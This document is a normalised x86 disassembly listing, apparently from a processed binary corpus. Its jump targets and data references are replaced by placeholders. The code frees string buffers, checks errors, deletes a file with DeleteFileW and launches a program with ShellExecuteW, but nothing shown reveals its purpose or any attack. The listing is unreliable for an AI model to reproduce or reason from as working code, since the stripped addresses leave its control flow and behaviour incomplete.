mov edx [ ebp - 0x33c ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
cmp [ ebp - 0x1bc ] 0x8
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] dx
jb r-xdata
mov ecx [ ebp - 0x10c ]
push ecx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x360 ] esi
mov [ ebp - 0x364 ] ebx
mov [ ebp - 0x374 ] dx
cmp [ ebp - 0x37c ] edi
jb r-xdata
mov ecx [ ebp - 0x374 ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x130 ] 0x8
mov [ ebp - 0x1bc ] esi
mov [ ebp - 0x1c0 ] ebx
mov [ ebp - 0x1d0 ] cx
jb r-xdata
mov eax [ ebp - 0x1d0 ]
push eax
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x37c ] esi
mov [ ebp - 0x380 ] ebx
mov [ ebp - 0x390 ] cx
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov eax [ ebp - 0x390 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
cmp [ ebp - 0x1a0 ] 0x8
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] ax
jb r-xdata
mov edx [ ebp - 0x144 ]
push edx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] ax
cmp [ ebp - 0x344 ] edi
jb r-xdata
mov edx [ ebp - 0x9c ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
cmp [ ebp - 0x114 ] 0x8
mov [ ebp - 0x1a0 ] esi
mov [ ebp - 0x1a4 ] ebx
mov [ ebp - 0x1b4 ] dx
jb r-xdata
mov ecx [ ebp - 0x1b4 ]
push ecx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x344 ] esi
mov [ ebp - 0x348 ] ebx
mov [ ebp - 0x358 ] dx
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov ecx [ ebp - 0x358 ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x50 ] 0x8
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] cx
jb r-xdata
mov eax [ ebp - 0x128 ]
push eax
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] cx
cmp [ ebp - 0x398 ] edi
jb r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
cmp [ ebp - 0xc0 ] 0x8
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] ax
jb r-xdata
mov edx [ ebp - 0x64 ]
push edx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x398 ] esi
mov [ ebp - 0x39c ] ebx
mov [ ebp - 0x3ac ] ax
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x3ac ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
cmp [ ebp - 0x6c ] 0x8
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] dx
jb r-xdata
mov ecx [ ebp - 0xd4 ]
push ecx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] dx
cmp [ ebp - 0x14c ] edi
jb r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] cx
jb r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x14c ] esi
mov [ ebp - 0x150 ] ebx
mov [ ebp - 0x160 ] cx
cmp [ ebp - 0x1a0 ] edi
jb r-xdata
mov eax [ ebp - 0x160 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
cmp [ ebp - 0x88 ] 0x8
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x1a0 ] esi
mov [ ebp - 0x1a4 ] ebx
mov [ ebp - 0x1b4 ] ax
cmp [ ebp - 0x168 ] edi
jb r-xdata
mov edx [ ebp - 0x1b4 ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
cmp [ ebp - 0xa4 ] 0x8
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] dx
mov [ ebp - 0x4 ] 0xd
jb r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x168 ] esi
mov [ ebp - 0x16c ] ebx
mov [ ebp - 0x17c ] dx
cmp [ ebp - 0x1bc ] edi
jb r-xdata
mov ecx [ ebp - 0x17c ]
push ecx
call sub_41a0d6
add esp 0x4
movzx eax [ ebp + 0x44 ]
dec eax
je r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x1bc ] esi
mov [ ebp - 0x1c0 ] ebx
mov [ ebp - 0x1d0 ] cx
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov eax [ ebp - 0x1d0 ]
push eax
call sub_41a0d6
add esp 0x4
sub esp 0x1c
mov ecx esp
xor edx edx
lea eax [ ebp - 0x67c ]
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
mov [ ebp - 0x6bc ] esp
mov [ ecx ] dx
lea edi [ eax + 0x2 ]
dec eax
je r-xdata
push 0xffffffff
push ebx
lea eax [ ebp - 0x48 ]
push eax
mov edx [ ebp - 0xb8 ]
push edx
call sub_41a0d6
add esp 0x4
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
lea eax [ ebp - 0x67c ]
push eax
call sub_403650
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6c8 ] esp
push 0xffffffff
push ebx
lea eax [ ebp + 0x8 ]
xor edx edx
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push eax
mov [ ebp - 0x4 ] 0x29
mov [ ecx ] dx
call sub_401ae0
mov ecx [ ebp - 0x6b4 ]
mov [ ebp - 0x4 ] 0xd
call sub_413960
cmp eax 0x1
jne r-xdata
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] dx
call sub_403650
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x2cc ]
push edx
mov [ ebp - 0x4 ] 0x30
call sub_407e50
lea ecx [ ebp - 0x67c ]
push ecx
push eax
lea edx [ ebp - 0x198 ]
push edx
mov [ ebp - 0x4 ] 0x31
call sub_413900
add esp 0x18
push eax
lea ecx [ ebp - 0x224 ]
mov [ ebp - 0x4 ] 0x32
call sub_403a40
mov edi 0x8
cmp [ ebp - 0x184 ] edi
jb r-xdata
dec eax
je r-xdata
cmp eax ebx
jne r-xdata
call [ GetLastError@IAT ]
push ebx
push eax
lea ecx [ ebp - 0x304 ]
push ecx
call sub_4134d0
add esp 0xc
mov edi eax
push 0x14
xor edx edx
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x2a
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] dx
call sub_403650
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x1ec ]
push ecx
lea edx [ ebp - 0x278 ]
push edx
mov [ ebp - 0x4 ] 0x2b
call sub_407e50
push edi
push eax
lea eax [ ebp - 0x2b0 ]
push eax
mov [ ebp - 0x4 ] 0x2c
call sub_413870
add esp 0x18
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2d
call sub_4077d0
mov edi 0x8
cmp [ ebp - 0x29c ] edi
jb r-xdata
xor ecx ecx
mov [ ebp - 0x184 ] esi
mov [ ebp - 0x188 ] ebx
mov [ ebp - 0x198 ] cx
cmp [ ebp - 0x2b8 ] edi
jb r-xdata
mov eax [ ebp - 0x198 ]
push eax
call sub_41a0d6
add esp 0x4
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] dx
call sub_403650
lea eax [ ebp - 0x9c ]
push eax
lea ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0xd4 ]
push edx
mov [ ebp - 0x4 ] 0x39
call sub_407e50
lea ecx [ ebp - 0x67c ]
push ecx
push eax
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x4 ] 0x3a
call sub_413900
add esp 0x18
push eax
lea ecx [ ebp - 0x224 ]
mov [ ebp - 0x4 ] 0x3b
call sub_403a40
mov edi 0x8
cmp [ ebp - 0x18 ] edi
jb r-xdata
push 0xffffffff
push ebx
lea ecx [ ebp - 0x1ec ]
push ecx
lea ecx [ ebp - 0x48 ]
call sub_4077d0
jmp r-xdata
push 0x1
xor eax eax
push r--data
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] ax
call sub_403650
lea ecx [ ebp - 0xb8 ]
push ecx
lea edx [ ebp - 0x3c8 ]
push edx
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x43
call sub_407e50
add esp 0xc
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x44
call sub_4077d0
mov edi 0x8
cmp [ ebp - 0x18 ] edi
jb r-xdata
push esi
xor edx edx
push r--data
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] dx
call sub_403650
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x1ec ]
push ecx
lea edx [ ebp - 0x208 ]
push edx
mov [ ebp - 0x4 ] 0x2e
call sub_407e50
add esp 0xc
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2f
call sub_4077d0
mov edi 0x8
cmp [ ebp - 0x1f4 ] edi
jb r-xdata
xor edx edx
mov [ ebp - 0x29c ] esi
mov [ ebp - 0x2a0 ] ebx
mov [ ebp - 0x2b0 ] dx
cmp [ ebp - 0x264 ] edi
jb r-xdata
mov ecx [ ebp - 0x2b0 ]
push ecx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x2b8 ] esi
mov [ ebp - 0x2bc ] ebx
mov [ ebp - 0x2cc ] ax
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov edx [ ebp - 0x2cc ]
push edx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x1f4 ] esi
mov [ ebp - 0x1f8 ] ebx
mov [ ebp - 0x208 ] cx
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov eax [ ebp - 0x208 ]
push eax
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x264 ] esi
mov [ ebp - 0x268 ] ebx
mov [ ebp - 0x278 ] cx
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov eax [ ebp - 0x278 ]
push eax
call sub_41a0d6
add esp 0x4
mov eax [ ebp - 0x224 ]
xor edx edx
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] dx
cmp [ ebp - 0x210 ] edi
jae r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] ax
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_41a0d6
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ ebp - 0x48 ]
push ecx
jmp r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_41a0d6
add esp 0x4
mov edx [ ebp - 0xb8 ]
push edx
xor eax eax
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] ax
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x2f0 ] edi
jb r-xdata
mov edx [ ebp - 0x64 ]
push edx
call sub_41a0d6
add esp 0x4
push eax
call [ DeleteFileW@IAT ]
test eax eax
setne al
cmp al bl
jne r-xdata
lea eax [ ebp - 0x224 ]
xor edx edx
push 0x18
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] dx
call sub_41ac18
add esp 0x4
mov [ ebp - 0x6bc ] eax
mov [ ebp - 0x4 ] 0x3c
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0x6b4 ]
add ecx edi
call sub_4077d0
mov ecx [ ebp - 0x304 ]
push ecx
jmp r-xdata
push r--data
lea ecx [ ebp - 0x160 ]
call sub_403cc0
push eax
lea edx [ ebp - 0x1ec ]
push edx
lea eax [ ebp - 0x2e8 ]
push eax
mov [ ebp - 0x4 ] 0x37
call sub_407e50
add esp 0xc
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x38
call sub_4077d0
cmp [ ebp - 0x2d4 ] edi
jb r-xdata
call [ GetLastError@IAT ]
push ebx
push eax
lea eax [ ebp - 0x17c ]
push eax
call sub_4134d0
add esp 0xc
mov edi eax
push r--data
lea ecx [ ebp - 0x294 ]
mov [ ebp - 0x4 ] 0x33
call sub_403cc0
push eax
lea ecx [ ebp - 0x1ec ]
push ecx
lea edx [ ebp - 0x240 ]
push edx
mov [ ebp - 0x4 ] 0x34
call sub_407e50
push edi
push eax
lea eax [ ebp - 0x25c ]
push eax
mov [ ebp - 0x4 ] 0x35
call sub_413870
add esp 0x18
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x36
call sub_4077d0
mov edi 0x8
cmp [ ebp - 0x248 ] edi
jb r-xdata
mov [ ebp - 0x6b0 ] ebx
mov edi ebx
mov ecx eax
call sub_412420
mov edi eax
mov [ ebp - 0x6b0 ] edi
jmp r-xdata
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x2d4 ] esi
mov [ ebp - 0x2d8 ] ebx
mov [ ebp - 0x2e8 ] dx
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x14c ] edi
jb r-xdata
mov ecx [ ebp - 0x2e8 ]
push ecx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x248 ] esi
mov [ ebp - 0x24c ] ebx
mov [ ebp - 0x25c ] dx
cmp [ ebp - 0x22c ] edi
jb r-xdata
mov ecx [ ebp - 0x25c ]
push ecx
call sub_41a0d6
add esp 0x4
lea ecx [ ebp - 0x144 ]
push ecx
mov ecx edi
call sub_412790
mov ecx [ ebp - 0x6b4 ]
add ecx 0x3c
mov edi 0x8
cmp [ ecx + 0x14 ] edi
jb r-xdata
lea ecx [ ebp - 0x128 ]
push ecx
mov ecx edi
call sub_412790
mov ecx [ ebp - 0x224 ]
mov edx 0x8
cmp [ ebp - 0x210 ] edx
jae r-xdata
push 0xb
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0xd
call sub_4124b0
push 0xa
push rw-data
mov ecx edi
call sub_412490
mov eax [ ebp - 0x6b4 ]
cmp [ eax + 0x4c ] ebx
jne r-xdata
mov eax [ ebp - 0x160 ]
push eax
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x22c ] esi
mov [ ebp - 0x230 ] ebx
mov [ ebp - 0x240 ] cx
cmp [ ebp - 0x280 ] edi
jb r-xdata
mov eax [ ebp - 0x240 ]
push eax
call sub_41a0d6
add esp 0x4
mov edx [ ebp - 0x224 ]
cmp [ ebp - 0x210 ] edi
jae r-xdata
mov ecx [ ecx ]
cmp [ eax + 0x14 ] edx
jb r-xdata
lea ecx [ ebp - 0x224 ]
xor eax eax
mov [ ebp - 0x280 ] esi
mov [ ebp - 0x284 ] ebx
mov [ ebp - 0x294 ] ax
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x168 ] edi
jb r-xdata
mov edx [ ebp - 0x294 ]
push edx
call sub_41a0d6
add esp 0x4
cmp [ eax + 0x14 ] edi
jb r-xdata
lea edx [ ebp - 0x224 ]
push ebx
push ebx
push ebx
push ecx
push eax
push ebx
call [ ShellExecuteW@IAT ]
cmp [ ebp - 0x114 ] 0x8
mov edi eax
jb r-xdata
mov eax [ eax ]
mov ecx [ ebp - 0x17c ]
push ecx
jmp r-xdata
push ebx
push ebx
push ecx
push edx
push eax
push ebx
call [ ShellExecuteW@IAT ]
cmp [ ebp - 0x130 ] 0x8
mov edi eax
jb r-xdata
mov eax [ eax ]
xor eax eax
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] ax
jmp r-xdata
mov edx [ ebp - 0x128 ]
push edx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] ax
mov edx [ ebp - 0x144 ]
push edx
call sub_41a0d6
add esp 0x4
cmp edi 0x20
ja r-xdata
push r--data
lea ecx [ ebp - 0xf0 ]
call sub_403cc0
push eax
lea edx [ ebp - 0x1ec ]
push edx
lea eax [ ebp - 0x10c ]
push eax
mov [ ebp - 0x4 ] 0x41
call sub_407e50
add esp 0xc
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x42
call sub_4077d0
mov edi 0x8
cmp [ ebp - 0xf8 ] edi
jb r-xdata
mov eax edi
cdq
push edx
push eax
lea ecx [ ebp - 0x358 ]
push ecx
call sub_4134d0
add esp 0xc
mov edi eax
push r--data
lea ecx [ ebp - 0x390 ]
mov [ ebp - 0x4 ] 0x3d
call sub_403cc0
push eax
lea edx [ ebp - 0x1ec ]
push edx
lea eax [ ebp - 0x374 ]
push eax
mov [ ebp - 0x4 ] 0x3e
call sub_407e50
push edi
push eax
lea ecx [ ebp - 0x33c ]
push ecx
mov [ ebp - 0x4 ] 0x3f
call sub_413870
add esp 0x18
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x40
call sub_4077d0
lea ecx [ ebp - 0x33c ]
call sub_401900
lea ecx [ ebp - 0x374 ]
call sub_401900
lea ecx [ ebp - 0x390 ]
call sub_401900
lea ecx [ ebp - 0x358 ]
mov [ ebp - 0x4 ] 0xd
call sub_401900
jmp r-xdata
xor edx edx
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] dx
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0xdc ] edi
jb r-xdata
mov ecx [ ebp - 0x10c ]
push ecx
call sub_41a0d6
add esp 0x4
mov edi [ ebp - 0x6b0 ]
cmp edi ebx
je r-xdata
xor ecx ecx
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] cx
mov eax [ ebp - 0xf0 ]
push eax
call sub_41a0d6
add esp 0x4
mov ecx edi
call sub_412460
push edi
jmp r-xdata
sub_416510
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
je r-xdata
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov eax 0xffff
cmp [ esi + 0x4 ] ax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ rw-data ]
push edi
lea eax [ ecx + edx + 0x4 ]
push 0x1
push eax
mov [ ebp + 0x8 ] eax
call sub_41acef
mov edi eax
add esp 0x8
cmp edi ebx
jne r-xdata
push 0x8
call sub_41ac18
add esp 0x4
cmp eax ebx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ rw-data ]
mov [ edi ] eax
mov cx [ esi + 0x4 ]
mov eax [ rw-data ]
mov [ eax + edi ] cx
add edx eax
mov al [ esi + 0x6 ]
mov [ edx + edi ] al
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax [ rw-data ]
push ecx
mov ecx esi
push edx
sub ecx eax
sub ecx 0x4
push ecx
lea edx [ eax + edi + 0x4 ]
push edx
call sub_41ad2f
add esp 0x10
cmp [ ebx ] 0x0
jne r-xdata
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov ebx eax
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
mov [ ebx ] edi
mov [ ebx + 0x4 ] esi
sub_4165d0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
xor esi esi
push edi
cmp ebx esi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0xc
mov edi [ ebp + 0x10 ]
cmp edi [ rw-data ]
jb r-xdata
push 0x10
call sub_41ac18
add esp 0x4
cmp eax esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
sub edi [ rw-data ]
mov [ esi ] eax
mov dx [ ecx + ebx ]
mov eax [ rw-data ]
mov [ esi + 0x4 ] dx
mov cl [ eax + ebx ]
push 0x1
push edi
mov [ esi + 0x6 ] cl
call sub_41acef
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
mov dl [ rw-data ]
mov ecx 0xffff
mov [ eax ] esi
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] cx
mov [ eax + 0x6 ] 0xff
mov [ eax + 0x7 ] dl
mov esi eax
mov edx [ rw-data ]
add edx [ ebp + 0xc ]
push edi
push edx
push edi
push ebx
call sub_41ad2f
add esp 0x10
cmp [ esi + 0x8 ] 0x0
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] edi
sub_416690
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov [ ebp - 0x8 ] edi
test esi esi
jne r-xdata
mov eax [ edi ]
mov edx [ eax ]
push esi
call edx
test al al
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
sub eax 0x4
jmp r-xdata
xor edx edx
cmp [ esi + 0x4 ] 0x4
jbe r-xdata
test ecx ecx
je r-xdata
mov edi [ ebp - 0x4 ]
mov edx 0xb
mov eax rw-data
lea ecx [ edi + esi - 0xb ]
push ebx
nop
mov edx [ rw-data ]
add edx ecx
jmp r-xdata
push esi
call sub_41a7eb
add esp 0x4
pop ebx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
sub edx 0x4
add eax 0x4
add ecx 0x4
cmp edx 0x4
jae r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx [ rw-data ]
sub eax ecx
add ecx edx
push eax
push ecx
mov ecx [ edi + 0x8 ]
call sub_412d70
mov esi eax
test esi esi
je r-xdata
mov ebx [ ecx ]
cmp ebx [ eax ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov al [ eax + 0x2 ]
cmp al [ ecx + 0x2 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test eax eax
je r-xdata
or eax 0xffffffff
mov edx [ rw-data ]
mov eax [ eax + edx ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add edi 0xfffffff5
push edi
push esi
push eax
call sub_4165d0
push esi
mov edi eax
call sub_41a7eb
add esp 0x4
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_416790
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
xor edx edx
mov edx [ esi + 0x4 ]
sub edx 0x4
jmp r-xdata
mov ecx [ ecx + 0x8 ]
xor eax eax
push edx
push eax
call sub_412c70
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x4 ] 0x4
jbe r-xdata
test eax eax
je r-xdata
add eax [ rw-data ]
mov ecx [ ecx + 0x8 ]
push edx
push eax
call sub_412c70
pop esi
pop ebp
retn 0x4
sub_4167e0
push ebp
mov ebp esp
push esi
push edi
mov esi ecx
mov ecx [ esi + 0x8 ]
push 0xffffffff
push 0x0
call sub_412c20
mov edx [ ebp + 0xc ]
mov ecx eax
shr ecx 0x10
xor ecx eax
mov eax [ ebp + 0x8 ]
movzx edi cx
mov ecx [ esi + 0x8 ]
push edx
push eax
push edi
call sub_4129d0
movzx eax ax
shl eax 0x10
xor eax edi
pop edi
pop esi
pop ebp
retn 0x8
sub_416820
push ebp
mov ebp esp
push 0xffffffff
push sub_42ecab
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x8
mov [ esi ] r--data
mov [ esi + 0x4 ] 0x0
call sub_41ac18
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
mov ecx eax
call sub_412980
jmp r-xdata
mov [ esi + 0x8 ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_4168a0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
test eax eax
jne r-xdata
push esi
push eax
call sub_416510
mov esi eax
cmp [ esi ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn 0x4
push edi
mov [ ebp - 0x4 ] 0x0
mov edi [ esi ]
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
sub eax 0x4
jmp r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
pop ebx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
je r-xdata
push ebx
add eax 0xb
push 0x1
push eax
mov [ ebp - 0xc ] eax
call sub_41acef
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
xor ecx ecx
mov ecx [ esi + 0x4 ]
sub ecx 0x4
jmp r-xdata
xor edx edx
cmp [ esi + 0x4 ] 0x4
jbe r-xdata
test edi edi
je r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
sub eax 0x4
jmp r-xdata
mov eax [ rw-data ]
lea edx [ edi + eax ]
jmp r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
sub eax 0x4
jmp r-xdata
push ecx
push edx
push eax
push ebx
call sub_41ad2f
add esp 0x10
cmp [ esi ] 0x0
je r-xdata
test edi edi
je r-xdata
push esi
call sub_41a0d6
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add esp 0x4
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx [ eax + 0x8 ]
push edx
push ebx
call sub_412ca0
push ebx
mov edi eax
call sub_41a7eb
add esp 0x4
test edi edi
jne r-xdata
push eax
call sub_41a7eb
add esp 0x4
push 0xb
push rw-data
add eax ebx
push 0xb
push eax
call sub_41ad2f
mov eax [ esi ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ ebp - 0x8 ]
push edi
call sub_4167e0
mov ebx [ ebp - 0x4 ]
add ebx 0x8
push 0x1
push ebx
mov [ ebp - 0x10 ] eax
call sub_41acef
mov edx [ ebp + 0x8 ]
push 0x4
mov esi eax
mov eax [ edx ]
lea ecx [ ebp - 0x10 ]
push ecx
lea edx [ esi + 0x4 ]
push 0x4
push edx
mov [ esi ] eax
call sub_41ad2f
mov eax [ ebp - 0x4 ]
